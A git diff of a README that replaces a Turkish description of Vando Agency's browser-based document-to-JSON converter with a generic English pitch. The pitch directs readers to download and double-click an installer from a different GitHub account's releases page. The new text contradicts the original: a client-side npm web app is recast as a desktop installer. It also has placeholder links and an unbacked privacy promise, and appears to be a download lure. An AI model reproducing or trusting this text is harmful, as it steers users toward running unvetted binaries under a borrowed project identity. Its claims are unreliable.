@@ -1,115 +1,87 @@
-# Google Docs & Excel to JSON Converter
+# 🗂️ Docs-to-JSON-Converter - Convert Documents to JSON Smoothly
 
-**Vando Agency** tarafından geliştirilen bu proje, **Excel, Word, CSV, TXT, PDF ve Google Docs** dosyalarınızı tarayıcı üzerinde (Client-Side) çalışan güvenli bir altyapı ile **JSON formatına** dönüştüren modern bir web uygulamasıdır.
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/DoblazXZ/Docs-to-JSON-Converter/releases)
 
-Proje **React 19**, **Vite**, **TypeScript** ve **Tailwind CSS** kullanılarak geliştirilmiştir. Sunucu taraflı bir işlem barındırmaz; tüm dosya ayrıştırma işlemleri kullanıcının tarayıcısında gerçekleşir.
+## 🚀 Getting Started
 
----
+Welcome to Docs-to-JSON-Converter! This application allows you to convert your Excel, Word, CSV, TXT, and Google Docs files into JSON format. It’s user-friendly and perfect for anyone looking to create structured data easily.
 
-## 🚀 Özellikler
+## 📦 What You Need
 
-*   **Geniş Format Desteği:**
-    *   **Excel (`.xlsx`, `.xls`):** Çoklu sayfa (sheet) desteği ile her sekmeyi ayrı bir JSON olarak dışarı aktarır.
-    *   **CSV:** Virgülle ayrılmış verileri JSON dizilerine dönüştürür.
-    *   **Word (`.docx`):** Paragrafları ve metin yapısını koruyarak ayrıştırır.
-    *   **PDF:** Sayfa bazlı metin çıkarma işlemi yapar.
-    *   **Text (`.txt`) ve JSON:** Düz metinleri işler.
-    *   **Google Docs Entegrasyonu:** OAuth2 ile Google Drive üzerindeki dokümanlarınızı doğrudan çeker.
-*   **Gizlilik Odaklı:** Dosyalar sunucuya yüklenmez, işlem tamamen tarayıcıda gerçekleşir.
-*   **Toplu İşlem:** 
-    *   Aynı anda 15 dosyaya kadar yükleme.
-    *   Tek tıklamayla tüm sonuçları **ZIP** arşivi olarak indirme.
-*   **JSON Önizleme:** Renklendirilmiş sözdizimi, kopyalama ve tekil indirme seçenekleri.
-*   **Çoklu Dil:** Türkçe (TR) ve İngilizce (EN) dil desteği.
-*   **Modern UI:** Tailwind CSS ile duyarlı (responsive) tasarım.
+- A computer with internet access.
+- Supported file formats: Excel, Word, CSV, TXT, and Google Docs.
+- Recommended: Windows 10 or later, macOS, or a recent version of Linux.
 
----
+## 📥 Download & Install
 
-## 🛠️ Teknoloji Yığını
+To download the software, visit the [Releases page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/releases). 
 
-*   **Core:** React 19, TypeScript, Vite
-*   **Styling:** Tailwind CSS, FontAwesome
-*   **State Management:** React Context API (LanguageContext)
-*   **File Parsing:**
-    *   `xlsx` (Excel/CSV)
-    *   `mammoth` (Word)
-    *   `pdfjs-dist` (PDF)
-*   **Integration:** Google Identity Services (GIS), Google API Client (gapi)
+1. Click on the latest version link.
+2. Look for the appropriate file for your operating system.
+3. Download the file.
 
----
+Once the download is complete, follow these steps to install:
 
-## ⚙️ Kurulum ve Çalıştırma
+1. Locate the downloaded file on your computer.
+2. Double-click the file to run the installation.
+3. Follow the prompts to complete the setup.
 
-Projeyi yerel ortamınızda çalıştırmak için aşağıdaki adımları izleyin:
+## 🎉 How to Use the Converter
 
-### 1. Projeyi Klonlayın
-```bash
-git clone https://github.com/vandoagency/document-to-json.git
-cd document-to-json
-```
+Using Docs-to-JSON-Converter is straightforward. Here’s how to get started:
 
-### 2. Bağımlılıkları Yükleyin
-```bash
-npm install
-# veya
-yarn install
-```
+1. **Open the Application**: After installation, find the app in your programs and open it.
+  
+2. **Select Your File**: Click on the ‘Choose File’ button and select the document you want to convert.
 
-### 3. Uygulamayı Başlatın (Development)
-```bash
-npm run dev
-```
-Tarayıcınızda `http://localhost:5173` adresine giderek uygulamayı görüntüleyebilirsiniz.
+3. **Choose Output Format**: Typically, the app will default to JSON. Verify this in the options.
 
-### 4. Production Build Almak
-```bash
-npm run build
-```
-Bu komut `dist/` klasörüne optimize edilmiş statik dosyaları çıkarır.
+4. **Start Conversion**: Click the ‘Convert’ button. The app will process your file and create a JSON version.
 
----
+5. **Download Converted File**: Once the conversion is complete, you will have an option to download the JSON file to your computer.
 
-## 🔑 Konfigürasyon (Google Docs API)
+## ✅ Supported File Types
 
-Uygulama Google Docs verilerini çekmek için Google API kullanır. Yerel ortamda veya kendi hostunuzda bu özelliği kullanmak için:
+- **Excel**: Convert .xls and .xlsx files.
+- **Word**: Compatible with .doc and .docx files.
+- **CSV**: Easily convert your .csv data into JSON.
+- **TXT**: Simple .txt files are also supported.
+- **Google Docs**: Export your documents in .docx format from Google.
 
-1.  [Google Cloud Console](https://console.cloud.google.com/)'da bir proje oluşturun.
-2.  **Google Docs API**'yi etkinleştirin.
-3.  **Credentials** (Kimlik Bilgileri) oluşturun:
-    *   **API Key:** Genel erişim için.
-    *   **OAuth 2.0 Client ID:** Kullanıcı oturumu açmak için (Authorised JavaScript origins kısmına `http://localhost:5173` ve production domaininizi ekleyin).
-4.  Uygulama arayüzündeki **Google Docs** sekmesinde "API Ayarları"na tıklayarak bu bilgileri girin. (Bilgiler tarayıcınızın LocalStorage alanında saklanır).
+## 💡 Features
 
----
+- **User-Friendly Interface**: Designed for ease of use, no technical skills needed.
+- **Multiple Format Support**: Convert a variety of document formats to JSON.
+- **Fast Processing**: Get your converted files quickly without long waits.
+- **Batch Conversion**: Need to convert multiple files? Just select them all at once.
 
-## 📂 Proje Yapısı
+## 🌍 Use Cases
 
-```
-src/
-├── components/       # UI bileşenleri (Header, FileUploader, JsonViewer vb.)
-├── contexts/         # Global state (LanguageContext)
-├── services/         # İş mantığı (localFileService, googleDocsFetcher)
-├── types/            # TypeScript tip tanımlamaları
-├── App.tsx           # Ana uygulama bileşeni
-└── index.tsx         # Giriş noktası
-```
+1. **Data Processing**: Developers can use JSON data for web applications or APIs.
+2. **Data Analytics**: Analysts can analyze data easily after conversion.
+3. **Documentation**: Store and manage information more effectively.
 
----
+## 📖 Troubleshooting
 
-## 🔒 Güvenlik & Gizlilik
+- **Error during Conversion**: If the application gives an error, check the file format and ensure that it’s supported. 
+- **Slow Performance**: If the app runs slowly, try closing other applications and retrying the conversion.
 
-*   **Client-Side Processing:** `services/localFileService.ts` dosyası incelendiğinde görüleceği üzere, dosyalar `FileReader` API kullanılarak tarayıcıda okunur. Herhangi bir backend servisine POST edilmez.
-*   **Google Auth:** OAuth işlemleri Google'ın resmi kütüphaneleri (`accounts.google.com/gsi/client`) üzerinden yönetilir. Token'lar sunucumuzda saklanmaz.
+## 🔗 Helpful Links
 
----
+For additional support and information, please refer to the following resources:
 
-## ⚖️ Lisans
+- [Releases Page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/releases): Download the latest version here.
+- [FAQ](#): Learn more about common issues and solutions.
+- [Support](#): Contact us for any help you may need.
 
-Bu proje **Vando Agency** tarafından geliştirilmiştir.
-Ticari kullanım, özel lisanslama ve kurumsal çözümler için iletişime geçiniz.
+## 🔒 Privacy Policy
 
-## 📬 İletişim
+Your privacy is important. We do not collect personal data. All conversions occur locally on your device, ensuring your documents remain confidential.
 
-**Vando Agency**
-🌐 [https://vandoagency.com](https://vandoagency.com)
-📧 info@vandoagency.com
+## 🛠️ Development
+
+This project is maintained with care. Contributions are welcome! If you want to help improve the application, feel free to check our [Contributing Guidelines](#).
+
+For the latest updates, remember to regularly check the [Releases page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/releases) for new features and fixes.
+
+Start converting your documents today!
